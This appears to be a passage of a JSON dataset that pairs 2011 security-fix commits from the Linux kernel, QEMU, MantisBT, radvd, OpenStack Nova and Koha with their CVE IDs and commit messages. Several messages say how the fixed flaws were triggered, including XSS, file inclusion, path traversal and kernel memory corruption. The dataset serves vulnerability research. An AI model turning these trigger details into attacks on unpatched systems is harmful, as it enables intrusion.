    "body": "x86 is the only arch right now, which provides an optimized fordiv_long_long_rem and it has the downside that one has to be very careful thatthe divide doesn't overflow.The API is a little akward, as the arguments for the unsigned divide aresigned. The signed version also doesn't handle a negative divisor andproduces worse code on 64bit archs.There is little incentive to keep this API alive, so this converts the fewusers to the new API.Signed-off-by: Roman Zippel <zippel@linux-m68k.org>Cc: Ralf Baechle <ralf@linux-mips.org>Cc: Ingo Molnar <mingo@elte.hu>Cc: Thomas Gleixner <tglx@linutronix.de>Cc: john stultz <johnstul@us.ibm.com>Cc: Christoph Lameter <clameter@sgi.com>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2011-3209"
    ],
    "cveIdsCount": 1
  },
  "44b1928a2d0c574fec734f65744b4a53e20f7bede29c50959b2b988b7649b09a": {
    "url": "https://github.com/bonzini/qemu/commit/7285477ab11831b1cf56e45878a89170dd06d9b9",
    "title": "scsi-disk: lazily allocate bounce buffer",
    "body": "It will not be needed for reads and writes if the HBA provides a sglist.In addition, this lets scsi-disk refuse commands with an excessiveallocation length, as well as limit memory on usual well-behaved guests.Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>Signed-off-by: Kevin Wolf <kwolf@redhat.com>",
    "cveIds": [
      "CVE-2011-3346"
    ],
    "cveIdsCount": 1
  },
  "55657fdd889891b9952b3703cc294657c76eff9991a0743f43fd0fae7af12793": {
    "url": "https://github.com/bonzini/qemu/commit/103b40f51e4012b3b0ad20f615562a1806d7f49a",
    "title": "scsi-disk: commonize iovec creation between reads and writes",
    "body": "Also, consistently use qiov.size instead of iov.iov_len.Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>Signed-off-by: Kevin Wolf <kwolf@redhat.com>",
    "cveIds": [
      "CVE-2011-3346"
    ],
    "cveIdsCount": 1
  },
  "806bc2f75fb7ca5e9c65dfb39bfb510b8923c6ad5adaa10cd166cb645891c9ab": {
    "url": "https://github.com/mantisbt/mantisbt/commit/d00745f5e267eba4ca34286d125de685bc3a8034",
    "title": "Fix issue introduced previously whereby php_Self is now used unchecked.",
    "body": "introduced previously by john attempting to fix symlinks. Since we now use php 5.2, we can make use of filter_var.This is a simpler version of what we were trying to do previously aka http://git.mantisforge.org/w/mantisbt.git?a=commitdiff;h=5ac1fdf32717d0c82cca7e7660dd4fd316a6a1b8Depending on server/mantis config this can lead to XSS issuesDavid: Backported from master branch and removed unreachable code branch.Signed-off-by: David Hicks <d@hx.id.au>",
    "cveIds": [
      "CVE-2011-3356"
    ],
    "cveIdsCount": 1
  },
  "30c3f3afc367e4c0079417912c5137be916e45273f8e940502bfa985b88db21b": {
    "url": "https://github.com/mantisbt/mantisbt/commit/6ede60d3db9e202044f135001589cce941ff6f0f",
    "title": "Fix #11481: Don't show bug group actions that can't be used",
    "body": "Currently the bug action group dropdown list on view_all_bug_page.phpshows (almost) every available option, even if the current user isn'tauthorised to use those options.This patch implements checking to see which options are available to theuser for the issues which are currently shown on view_all_bug_page.php.Options are only displayed in the dropdown list if the user is able touse the option on at least one of the bugs displayed.Additionally, the logic behind when selection checkboxes are shownalongside a bug has been improved. Checkboxes won't display next to bugsthat the user cannot perform group actions on.Backported from master branch because it's needed to resolve an LFI/XSSissue in bug_actiongroup_ext.php.",
    "cveIds": [
      "CVE-2011-3357",
      "CVE-2011-3578"
    ],
    "cveIdsCount": 2
  },
  "b9f47bbd77dac803e76279058ae1236f62f4f19fd5b063a553bf5fbe6c910c70": {
    "url": "https://github.com/mantisbt/mantisbt/commit/5b93161f3ece2f73410c296fed8522f6475d273d",
    "title": "Rework the bug action group api such that we can easily convert this …",
    "body": "…to an object in the future, and to validate calls to require once.This leads to a security issue identified by IBM's Appscan program, whereby calls to require_once are not validated.Depending on webserver configuration, this is a file inclusion vulnerability.There will be a follow up commit to config api - probably:-if( $g_project_override != null ) {+if( $g_project_override != null && $p_project == null ) {At the moment, the action group API calls config_get with a project parameter to use. This is ignored, due to project_override being set - so we either need to:a) change project override within the command list functionb) modifify config api to only use the project override *if* it is attempting to look up information on the default project.Backported from master-1.2.x branch. Note that this commit relies uponcommit 6dc3510 from the master branch(that hadn't been backported to 1.2.x).Conflicts: bug_actiongroup_ext.php bug_actiongroup_ext_page.php bug_actiongroup_page.php core/bug_group_action_api.phpSigned-off-by: David Hicks <d@hx.id.au>",
    "cveIds": [
      "CVE-2011-3357",
      "CVE-2011-3578"
    ],
    "cveIdsCount": 2
  },
  "212fba8b01fac284aa3d7297050a132bfe7d0f850849c82f9ad76cf8773300c4": {
    "url": "https://github.com/mantisbt/mantisbt/commit/0a636b37d3425aea7b781e7f25eaeb164ac54a3d",
    "title": "Issue #13281: Fix Projax XSS issues (unescaped value attributes)",
    "body": "Projax sucks. This is why it was replaced with jQuery in the masterbranch. However master-1.2.x still uses the older Projax code. TheProjax library doesn't attempt to escape values before dumping them inHTML output, thus leading to XSS issues.The easiest workaround is to pass in already-escaped values to theProjax functions.This issue was reported by High-Tech Bridge SA Security Research Lab aspart of their advisory #HTB23045, available athttps://www.htbridge.ch/advisory/multiple_vulnerabilities_in_mantisbt.html",
    "cveIds": [
      "CVE-2011-3358"
    ],
    "cveIdsCount": 1
  },
  "c59c1620a27e68aabc45868d7d3f0880c6dfa79204db2c71441f90fef951e962": {
    "url": "https://github.com/torvalds/linux/commit/c85ce65ecac078ab1a1835c87c4a6319cf74660a",
    "title": "b43: allocate receive buffers big enough for max frame len + offset",
    "body": "Otherwise, skb_put inside of dma_rx can fail...https://bugzilla.kernel.org/show_bug.cgi?id=32042Signed-off-by: John W. Linville <linville@tuxdriver.com>Acked-by: Larry Finger <Larry.Finger@lwfinger.net>Cc: stable@kernel.org",
    "cveIds": [
      "CVE-2011-3359"
    ],
    "cveIdsCount": 1
  },
  "6ccafe16ad965acee1aaea9554d9ccb2a26339b2fc673069a951ed83145fdf35": {
    "url": "https://github.com/torvalds/linux/commit/70945643722ffeac779d2529a348f99567fa5c33",
    "title": "cifs: always do is_path_accessible check in cifs_mount",
    "body": "Currently, we skip doing the is_path_accessible check in cifs_mount ifthere is no prefixpath. I have a report of at least one server howeverthat allows a TREE_CONNECT to a share that has a DFS referral at itsroot. The reporter in this case was using a UNC that had no prefixpath,so the is_path_accessible check was not triggered and the box later hita BUG() because we were chasing a DFS referral on the root dentry forthe mount.This patch fixes this by removing the check for a zero-lengthprefixpath. That should make the is_path_accessible check be done inthis situation and should allow the client to chase the DFS referral atmount time instead.Cc: stable@kernel.orgReported-and-Tested-by: Yogesh Sharma <ysharma@cymer.com>Signed-off-by: Jeff Layton <jlayton@redhat.com>Signed-off-by: Steve French <sfrench@us.ibm.com>",
    "cveIds": [
      "CVE-2011-3363"
    ],
    "cveIdsCount": 1
  },
  "ef7d2d66e5afd9942ea1bca01586c1024ca40f54235e3af6539c0f3adcef3c7d": {
    "url": "https://github.com/punbb/punbb/commit/dd50a50a2760f10bd2d09814e30af4b36052ca6d",
    "title": "Fix XSS vulnerabilities described on http://seclists.org/fulldisclosu…",
    "body": "…re/2011/Sep/158",
    "cveIds": [
      "CVE-2011-3371"
    ],
    "cveIdsCount": 1
  },
  "26002c5c2b72f3be06d2c4635e52e7a2da6a553347265685318272ca81977737": {
    "url": "https://github.com/phppgadmin/phppgadmin/commit/1df248203de055f97e092b50b1dd9643ccb73842",
    "title": "Fix two security fix about XSS, reported by Mateusz Goik, fixed by io…",
    "body": "…guix.",
    "cveIds": [
      "CVE-2011-3598"
    ],
    "cveIdsCount": 1
  },
  "f499d739d61c2ca3b7edd02fafca291ebd6b89603dc5800f56fcf9af5ef31297": {
    "url": "https://github.com/reubenhwk/radvd/commit/92e22ca23e52066da2258df8c76a2dca8a428bcc",
    "title": "set_interface_var() doesn't check interface name and blindly does",
    "body": "fopen(path \"/\" ifname, \"w\") on it. As \"ifname\" is an untrusted input, itshould be checked for \"..\" and/or \"/\" in it. Otherwise, an infectedunprivileged daemon may overwrite contents of file named \"mtu\",\"hoplimit\", etc. in arbitrary location with arbitrary 32-bit value indecimal representation (\"%d\"). If an attacker has a local account ormay create arbitrary symlinks with these names in any location (e.g./tmp), any file may be overwritten with a decimal value.",
    "cveIds": [
      "CVE-2011-3602"
    ],
    "cveIdsCount": 1
  },
  "4b4abe86d44ee5461bbd50914a59d156c299b63ef14d98f1b7ad15a4397f43c9": {
    "url": "https://github.com/torvalds/linux/commit/a5b2c5b2ad5853591a6cac6134cd0f599a720865",
    "title": "AppArmor: fix oops in apparmor_setprocattr",
    "body": "When invalid parameters are passed to apparmor_setprocattr a NULL derefoops occurs when it tries to record an audit message. This is becauseit is passing NULL for the profile parameter for aa_audit. But aa_auditnow requires that the profile passed is not NULL.Fix this by passing the current profile on the task that is trying tosetprocattr.Signed-off-by: Kees Cook <kees@ubuntu.com>Signed-off-by: John Johansen <john.johansen@canonical.com>Cc: stable@kernel.orgSigned-off-by: James Morris <jmorris@namei.org>",
    "cveIds": [
      "CVE-2011-3619"
    ],
    "cveIdsCount": 1
  },
  "566ed3fa0f1dad82c6eef7e2ef9a6cdbfeeaaf63cc1d63d44248986c17ef0ece": {
    "url": "https://github.com/torvalds/linux/commit/76597cd31470fa130784c78fadb4dab2e624a723",
    "title": "proc: fix oops on invalid /proc/<pid>/maps access",
    "body": "When m_start returns an error, the seq_file logic will still call m_stopwith that error entry, so we'd better make sure that we check it beforeusing it as a vma.Introduced by commit ec6fd8a (\"report errors in /proc/*/*map*sanely\"), which replaced NULL with various ERR_PTR() cases.(On ia64, you happen to get a unaligned fault instead of a page fault,since the address used is generally some random error code like -EPERM)Reported-by: Anca Emanuel <anca.emanuel@gmail.com>Reported-by: Tony Luck <tony.luck@intel.com>Cc: Al Viro <viro@zeniv.linux.org.uk>Cc: Américo Wang <xiyou.wangcong@gmail.com>Cc: Stephen Wilson <wilsons@start.ca>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2011-3637"
    ],
    "cveIdsCount": 1
  },
  "059bda1357cc05bb835f72be6eb9f5e9baafead6f0e05a10195b53c39b118791": {
    "url": "https://github.com/torvalds/linux/commit/bfdc0b497faa82a0ba2f9dddcf109231dd519fcc",
    "title": "sysctl: restrict write access to dmesg_restrict",
    "body": "When dmesg_restrict is set to 1 CAP_SYS_ADMIN is needed to read the kernelring buffer. But a root user without CAP_SYS_ADMIN is able to resetdmesg_restrict to 0.This is an issue when e.g. LXC (Linux Containers) are used and completeuser space is running without CAP_SYS_ADMIN. A unprivileged and jailedroot user can bypass the dmesg_restrict protection.With this patch writing to dmesg_restrict is only allowed when root hasCAP_SYS_ADMIN.Signed-off-by: Richard Weinberger <richard@nod.at>Acked-by: Dan Rosenberg <drosenberg@vsecurity.com>Acked-by: Serge E. Hallyn <serge@hallyn.com>Cc: Eric Paris <eparis@redhat.com>Cc: Kees Cook <kees.cook@canonical.com>Cc: James Morris <jmorris@namei.org>Cc: Eugene Teo <eugeneteo@kernel.org>Cc: <stable@kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2011-4080"
    ],
    "cveIdsCount": 1
  },
  "d207e6676db3330a76ad7ca7057be7d3bd9a4a063ab9abd145daefe8002d8740": {
    "url": "https://github.com/torvalds/linux/commit/7ed47b7d142ec99ad6880bbbec51e9f12b3af74c",
    "title": "crypto: ghash - Avoid null pointer dereference if no key is set",
    "body": "The ghash_update function passes a pointer to gf128mul_4k_lle which willbe NULL if ghash_setkey is not called or if the most recent call toghash_setkey failed to allocate memory. This causes an oops. Fix thisup by returning an error code in the null case.This is trivially triggered from unprivileged userspace through theAF_ALG interface by simply writing to the socket without setting a key.The ghash_final function has a similar issue, but triggering it requiresa memory allocation failure in ghash_setkey _after_ at least onesuccessful call to ghash_update. BUG: unable to handle kernel NULL pointer dereference at 00000670 IP: [<d88c92d4>] gf128mul_4k_lle+0x23/0x60 [gf128mul] *pde = 00000000 Oops: 0000 [#1] PREEMPT SMP Modules linked in: ghash_generic gf128mul algif_hash af_alg nfs lockd nfs_acl sunrpc bridge ipv6 stp llc Pid: 1502, comm: hashatron Tainted: G W 3.1.0-rc9-00085-ge9308cf #32 Bochs Bochs EIP: 0060:[<d88c92d4>] EFLAGS: 00000202 CPU: 0 EIP is at gf128mul_4k_lle+0x23/0x60 [gf128mul] EAX: d69db1f0 EBX: d6b8ddac ECX: 00000004 EDX: 00000000 ESI: 00000670 EDI: d6b8ddac EBP: d6b8ddc8 ESP: d6b8dda4 DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068 Process hashatron (pid: 1502, ti=d6b8c000 task=d6810000 task.ti=d6b8c000) Stack: 00000000 d69db1f0 00000163 00000000 d6b8ddc8 c101a520 d69db1f0 d52aa000 00000ff0 d6b8dde8 d88d310f d6b8a3f8 d52aa000 00001000 d88d502c d6b8ddfc 00001000 d6b8ddf4 c11676ed d69db1e8 d6b8de24 c11679ad d52aa000 00000000 Call Trace: [<c101a520>] ? kmap_atomic_prot+0x37/0xa6 [<d88d310f>] ghash_update+0x85/0xbe [ghash_generic] [<c11676ed>] crypto_shash_update+0x18/0x1b [<c11679ad>] shash_ahash_update+0x22/0x36 [<c11679cc>] shash_async_update+0xb/0xd [<d88ce0ba>] hash_sendpage+0xba/0xf2 [algif_hash] [<c121b24c>] kernel_sendpage+0x39/0x4e [<d88ce000>] ? 0xd88cdfff [<c121b298>] sock_sendpage+0x37/0x3e [<c121b261>] ? kernel_sendpage+0x4e/0x4e [<c10b4dbc>] pipe_to_sendpage+0x56/0x61 [<c10b4e1f>] splice_from_pipe_feed+0x58/0xcd [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10 [<c10b51f5>] __splice_from_pipe+0x36/0x55 [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10 [<c10b6383>] splice_from_pipe+0x51/0x64 [<c10b63c2>] ? default_file_splice_write+0x2c/0x2c [<c10b63d5>] generic_splice_sendpage+0x13/0x15 [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10 [<c10b527f>] do_splice_from+0x5d/0x67 [<c10b6865>] sys_splice+0x2bf/0x363 [<c129373b>] ? sysenter_exit+0xf/0x16 [<c104dc1e>] ? trace_hardirqs_on_caller+0x10e/0x13f [<c129370c>] sysenter_do_call+0x12/0x32 Code: 83 c4 0c 5b 5e 5f c9 c3 55 b9 04 00 00 00 89 e5 57 8d 7d e4 56 53 8d 5d e4 83 ec 18 89 45 e0 89 55 dc 0f b6 70 0f c1 e6 04 01 d6 <f3> a5 be 0f 00 00 00 4e 89 d8 e8 48 ff ff ff 8b 45 e0 89 da 0f EIP: [<d88c92d4>] gf128mul_4k_lle+0x23/0x60 [gf128mul] SS:ESP 0068:d6b8dda4 CR2: 0000000000000670 ---[ end trace 4eaa2a86a8e2da24 ]--- note: hashatron[1502] exited with preempt_count 1 BUG: scheduling while atomic: hashatron/1502/0x10000002 INFO: lockdep is turned off. [...]Signed-off-by: Nick Bowler <nbowler@elliptictech.com>Cc: stable@kernel.org [2.6.37+]Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>",
    "cveIds": [
      "CVE-2011-4081"
    ],
    "cveIdsCount": 1
  },
  "cc1e4b0aec10f94822454fc29128f32b27843181c5f07d91c44b8390b978cb3b": {
    "url": "https://github.com/torvalds/linux/commit/15291164b22a357cb211b618adfef4fa82fc0de3",
    "title": "jbd2: clear BH_Delay & BH_Unwritten in journal_unmap_buffer",
    "body": "journal_unmap_buffer()'s zap_buffer: code clears a lot of buffer headstate ala discard_buffer(), but does not touch _Delay or _Unwritten asdiscard_buffer() does.This can be problematic in some areas of the ext4 code which assumethat if they have found a buffer marked unwritten or delay, then it'sa live one. Perhaps those spots should check whether it is mappedas well, but if jbd2 is going to tear down a buffer, let's reallytear it down completely.Without this I get some fsx failures on sub-page-block filesystemsup until v3.2, at which point 4e96b2dand 189e868 make the failures goaway, because buried within that large change is some more flagclearing. I still think it's worth doing in jbd2, since->invalidatepage leads here directly, and it's the right placeto clear away these flags.Signed-off-by: Eric Sandeen <sandeen@redhat.com>Signed-off-by: \"Theodore Ts'o\" <tytso@mit.edu>Cc: stable@vger.kernel.org",
    "cveIds": [
      "CVE-2011-4086"
    ],
    "cveIdsCount": 1
  },
  "6bcd4b167b85819279bbc6442adb965ec9776d3808080dc3842025b84d897068": {
    "url": "https://github.com/torvalds/linux/commit/56c6a8a4aadca809e04276eabe5552935c51387f",
    "title": "oom: fix integer overflow of points in oom_badness",
    "body": "commit ff05b6f upstream.An integer overflow will happen on 64bit archs if task's sum of rss,swapents and nr_ptes exceeds (2^31)/1000 value. This was introduced bycommitf755a04 oom: use pte pages in OOM scorewhere the oom score computation was divided into several steps and it's nolonger computed as one expression in unsigned long(rss, swapents, nr_pteare unsigned long), where the result value assigned to points(int) is inrange(1..1000). So there could be an int overflow while computing176 points *= 1000;and points may have negative value. Meaning the oom score for a mem hog taskwill be one.196 if (points <= 0)197 return 1;For example:[ 3366] 0 3366 35390480 24303939 5 0 0 oom01Out of memory: Kill process 3366 (oom01) score 1 or sacrifice childHere the oom1 process consumes more than 24303939(rss)*4096~=92GB physicalmemory, but it's oom score is one.In this situation the mem hog task is skipped and oom killer kills another andmost probably innocent task with oom score greater than one.The points variable should be of type long instead of int to prevent theint overflow.Signed-off-by: Frantisek Hrbata <fhrbata@redhat.com>Acked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>Acked-by: Oleg Nesterov <oleg@redhat.com>Acked-by: David Rientjes <rientjes@google.com>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>",
    "cveIds": [
      "CVE-2011-4097"
    ],
    "cveIdsCount": 1
  },
  "98b9df6d7e5112fc5f5c600cf4affd7d66706e0a833fa22fa53d1c154d16f6e3": {
    "url": "https://github.com/torvalds/linux/commit/64dd153c83743af81f20924c6343652d731eeecb",
    "title": "GFS2: rewrite fallocate code to write blocks directly",
    "body": "GFS2's fallocate code currently goes through the page cache. Since it's onlywriting to the end of the file or to holes in it, it doesn't need to, and itwas causing issues on low memory environments. This patch pulls in some ofSteve's block allocation work, and uses it to simply allocate the blocks forthe file, and zero them out at allocation time. It provides a slightperformance increase, and it dramatically simplifies the code.Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>Signed-off-by: Steven Whitehouse <swhiteho@redhat.com>",
    "cveIds": [
      "CVE-2011-4098"
    ],
    "cveIdsCount": 1
  },
  "96c8dcd1c5fd361cd7ab040b61ffd2ed53cfa36ebd42f1630218e57f90bf3ac8": {
    "url": "https://github.com/torvalds/linux/commit/ec8013beddd717d1740cfefb1a9b900deef85462",
    "title": "dm: do not forward ioctls from logical volumes to the underlying device",
    "body": "A logical volume can map to just part of underlying physical volume.In this case, it must be treated like a partition.Based on a patch from Alasdair G Kergon.Cc: Alasdair G Kergon <agk@redhat.com>Cc: dm-devel@redhat.comSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2011-4127"
    ],
    "cveIdsCount": 1
  },
  "19d9dee8f4697bc80c66d3daca88c8d9fba65838d19a6d569a6ec1184f3c8227": {
    "url": "https://github.com/torvalds/linux/commit/0bfc96cb77224736dfa35c3c555d37b3646ef35e",
    "title": "block: fail SCSI passthrough ioctls on partition devices",
    "body": "Linux allows executing the SG_IO ioctl on a partition or LVM volume, andwill pass the command to the underlying block device. This iswell-known, but it is also a large security problem when (via Unixpermissions, ACLs, SELinux or a combination thereof) a program or userneeds to be granted access only to part of the disk.This patch lets partitions forward a small set of harmless ioctls;others are logged with printk so that we can see which ioctls areactually sent. In my tests only CDROM_GET_CAPABILITY actually occurred.Of course it was being sent to a (partition on a) hard disk, so it wouldhave failed with ENOTTY and the patch isn't changing anything inpractice. Still, I'm treating it specially to avoid spamming the logs.In principle, this restriction should include programs running withCAP_SYS_RAWIO. If for example I let a program access /dev/sda2 and/dev/sdb, it still should not be able to read/write outside theboundaries of /dev/sda2 independent of the capabilities. However, fornow programs with CAP_SYS_RAWIO will still be allowed to send theioctls. Their actions will still be logged.This patch does not affect the non-libata IDE driver. That driverhowever already tests for bd != bd->bd_contains before issuing someioctl; it could be restricted further to forbid these ioctls even forprograms running with CAP_SYS_ADMIN/CAP_SYS_RAWIO.Cc: linux-scsi@vger.kernel.orgCc: Jens Axboe <axboe@kernel.dk>Cc: James Bottomley <JBottomley@parallels.com>Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>[ Make it also print the command name when warning - Linus ]Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2011-4127"
    ],
    "cveIdsCount": 1
  },
  "413d16215a1873fbe80c57f1a6b674cb9156eb3bd323118d2e2c469b7df7d8e3": {
    "url": "https://github.com/torvalds/linux/commit/bf118a342f10dafe44b14451a1392c3254629a1f",
    "title": "NFSv4: include bitmap in nfsv4 get acl data",
    "body": "The NFSv4 bitmap size is unbounded: a server can return an arbitrarysized bitmap in an FATTR4_WORD0_ACL request. Replace using thenfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a serverwith the inclusion of the bitmap (xdr length plus bitmasks) and the acl dataxdr length to the (cached) acl page data.This is a general solution to commit e5012d1 \"NFSv4.1: updatenfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufheadwhen getting ACLs.Fix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattrwas called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.Cc: stable@kernel.orgSigned-off-by: Andy Adamson <andros@netapp.com>Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>",
    "cveIds": [
      "CVE-2011-4131"
    ],
    "cveIdsCount": 1
  },
  "262cded69cef26045943469ca3e2c5744ff9037dd1cd2c834d16a0682a4ac801": {
    "url": "https://github.com/reviewboard/reviewboard/commit/7a0a9d94555502278534dedcf2d75e9fccce8c3d",
    "title": "Fix a comment vulnerability allowing scripts to be loaded.",
    "body": "Due to the way that comments were loaded in, it was possible toterminate a script and inject a new one while loading the diff viewer.This isn't believed to have been a problem in the wild, but is certainlyan important one to fix.We now ensure that the text is escaped at the point where it's being fedinto the JavaScript. It's no longer possible to inject scripts.Thanks to Damian Johnson for the heads up and for the fix that thischange is based on.This will be going into 1.5.7 and 1.6.3 releases.",
    "cveIds": [
      "CVE-2011-4312"
    ],
    "cveIdsCount": 1
  },
  "41a3f666c99f77bc485d55d916566dce947a391b403baefce1434fa7f2439edd": {
    "url": "https://github.com/torvalds/linux/commit/a9cf73ea7ff78f52662c8658d93c226effbbedde",
    "title": "ipv6: udp: fix the wrong headroom check",
    "body": "At this point, skb->data points to skb_transport_header.So, headroom check is wrong.For some case:bridge(UFO is on) + eth device(UFO is off),there is no enough headroom for IPv6 frag head.But headroom check is always false.This will bring about data be moved to there prior to skb->head,when adding IPv6 frag header to skb.Signed-off-by: Shan Wei <shanwei@cn.fujitsu.com>Acked-by: Herbert Xu <herbert@gondor.apana.org.au>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2011-4326"
    ],
    "cveIdsCount": 1
  },
  "0435c42e90fec14d9c3d3de4f2c27dee33b893c9404485a9f00efa0b486e77f4": {
    "url": "https://github.com/torvalds/linux/commit/c4e7f9022e506c6635a5037713c37118e23193e4",
    "title": "KVM: Device assignment permission checks",
    "body": "(cherry picked from commit 3d27e23)Only allow KVM device assignment to attach to devices which: - Are not bridges - Have BAR resources (assume others are special devices) - The user has permissions to useAssigning a bridge is a configuration error, it's not supported, andtypically doesn't result in the behavior the user is expecting anyway.Devices without BAR resources are typically chipset components thatalso don't have host drivers. We don't want users to hold such devicescaptive or cause system problems by fencing them off into an iommudomain. We determine \"permission to use\" by testing whether the userhas access to the PCI sysfs resource files. By default a normal userwill not have access to these files, so it provides a good indicationthat an administration agent has granted the user access to the device.[Yang Bai: add missing #include][avi: fix comment style]Signed-off-by: Alex Williamson <alex.williamson@redhat.com>Signed-off-by: Yang Bai <hamo.by@gmail.com>Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>",
    "cveIds": [
      "CVE-2011-4347"
    ],
    "cveIdsCount": 1
  },
  "a10167dd0a3497ec1dff07d614a0b6c142850f503a18355f1b810af196bf49ff": {
    "url": "https://github.com/torvalds/linux/commit/bc909d9ddbf7778371e36a651d6e4194b1cc7d4c",
    "title": "sendmmsg/sendmsg: fix unsafe user pointer access",
    "body": "Dereferencing a user pointer directly from kernel-space without goingthrough the copy_from_user family of functions is a bad idea. Two ofsuch usages can be found in the sendmsg code path called from sendmmsg,added bycommit c71d8eb upstream.commit 5b47b80 in the 3.0-stable tree.Usages are performed through memcmp() and memcpy() directly. Fix thoseby using the already copied msg_sys structure instead of the __user *msgstructure. Note that msg_sys can be set to NULL by verify_compat_iovec()or verify_iovec(), which requires additional NULL pointer checks.Signed-off-by: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>Signed-off-by: David Goulet <dgoulet@ev0ke.net>CC: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>CC: Anton Blanchard <anton@samba.org>CC: David S. Miller <davem@davemloft.net>CC: stable <stable@kernel.org>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2011-4594"
    ],
    "cveIdsCount": 1
  },
  "fdd8f202059b7bef6cce2ab04288312f4d03054ce9f12b963223af96cee7c6ad": {
    "url": "https://github.com/openstack/nova/commit/76363226bd8533256f7795bba358d7f4b8a6c9e6",
    "title": "Sanitize EC2 manifests and image tarballs",
    "body": "Prevent potential directory traversal with malicious EC2 image tarballs,by making sure the tarfile is safe before unpacking it. Fixes bug 894755Prevent potential directory traversal with malicious file names inEC2 image manifests. Fixes bug 885167(cherry picked from commit ad32419)Change-Id: If6109047307bd6e654ee9d1254f0d7f31cf741c1",
    "cveIds": [
      "CVE-2011-4596"
    ],
    "cveIdsCount": 1
  },
  "ba8671bff42598114a9bc4bddcd2c7125498af58cc457b0a096d1f28c99673ef": {
    "url": "https://github.com/openstack/nova/commit/ad3241929ea00569c74505ed002208ce360c667e",
    "title": "Sanitize EC2 manifests and image tarballs",
    "body": "Prevent potential directory traversal with malicious EC2 image tarballs,by making sure the tarfile is safe before unpacking it. Fixes bug 894755Prevent potential directory traversal with malicious file names inEC2 image manifests. Fixes bug 885167Change-Id: If6109047307bd6e654ee9d1254f0d7f31cf741c1",
    "cveIds": [
      "CVE-2011-4596"
    ],
    "cveIdsCount": 1
  },
  "a2964abf95fbcb8eede8ee001a91beed9a469b0054d9425f381d3fc4dd72ef87": {
    "url": "https://github.com/torvalds/linux/commit/b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c",
    "title": "batman-adv: Only write requested number of byte to user buffer",
    "body": "Don't write more than the requested number of bytes of an batman-adv icmppacket to the userspace buffer. Otherwise unrelated userspace memory might getoverridden by the kernel.Signed-off-by: Sven Eckelmann <sven@narfation.org>Signed-off-by: Marek Lindner <lindner_marek@yahoo.de>",
    "cveIds": [
      "CVE-2011-4604"
    ],
    "cveIdsCount": 1
  },
  "22a294f875377f15eaf243c6f3ac3c7c2818793c78bf0b017f29ac751eab69ce": {
    "url": "https://github.com/torvalds/linux/commit/0837e3242c73566fc1c0196b4ec61779c25ffc93",
    "title": "perf, powerpc: Handle events that raise an exception without overflowing",
    "body": "Events on POWER7 can roll back if a speculative event doesn'teventually complete. Unfortunately in some rare cases they willraise a performance monitor exception. We need to catch this toensure we reset the PMC. In all cases the PMC will be 256 or lesscycles from overflow.Signed-off-by: Anton Blanchard <anton@samba.org>Signed-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl>Cc: <stable@kernel.org> # as far back as it applies cleanlyLKML-Reference: <20110309143842.6c22845e@kryten>Signed-off-by: Ingo Molnar <mingo@elte.hu>",
    "cveIds": [
      "CVE-2011-4611"
    ],
    "cveIdsCount": 1
  },
  "9ae04c13e0165f89f3b4463c183ed9f91b41b17f4dfe0684a45377e5ca915287": {
    "url": "https://github.com/liblime/LibLime-Koha/commit/8ea6f7bc37d05a9ec25b5afbea011cf9de5f1e49#C4/Output.pm",
    "title": "[#21464023] Security: arbitrary file inclusion",
    "body": "Poor input cleansing can allow a well-constructed cookieto return the contents of arbitrary file system objects.",
    "cveIds": [
      "CVE-2011-4715"
    ],
    "cveIdsCount": 1
  },
  "07f6256d7759614e96dc4dabf2d9850513417821de45f3c838673db67b4339c4": {
    "url": "https://github.com/torvalds/linux/commit/be20250c13f88375345ad99950190685eda51eb8",
    "title": "ROSE: prevent heap corruption with bad facilities",
    "body": "When parsing the FAC_NATIONAL_DIGIS facilities field, it's possible fora remote host to provide more digipeaters than expected, resulting inheap corruption. Check against ROSE_MAX_DIGIS to prevent overflows, andabort facilities parsing on failure.Additionally, when parsing the FAC_CCITT_DEST_NSAP andFAC_CCITT_SRC_NSAP facilities fields, a remote host can provide a lengthof less than 10, resulting in an underflow in a memcpy size, causing akernel panic due to massive heap corruption. A length of greater than20 results in a stack overflow of the callsign array. Abort facilitiesparsing on these invalid length values.Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com>Cc: stable@kernel.orgSigned-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2011-4913"
    ],
    "cveIdsCount": 1
  },
  "5cf6c97b88c16fbbd37a8b26bd3f9f9fbd657fad1faad4877373ab3b7b4a9ece": {
